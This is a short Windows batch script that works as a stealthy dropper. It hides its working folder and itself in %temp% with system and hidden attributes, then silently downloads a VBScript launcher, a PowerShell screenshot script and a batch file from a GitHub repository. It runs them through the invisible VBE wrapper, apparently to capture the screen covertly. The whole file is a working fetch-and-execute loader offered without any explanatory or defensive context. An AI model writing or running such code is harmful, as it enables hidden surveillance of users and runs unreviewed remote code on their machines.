@echo off
cd %temp%
if not exist s\ (
  mkdir s
)
attrib +s +h s
attrib +s +h s.bat
cd s
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/invisible.vbe -o i.vbe
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/screenshot.ps1 -o s.ps1
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/run.bat -o r.bat
wscript.exe "i.vbe" "r.bat"
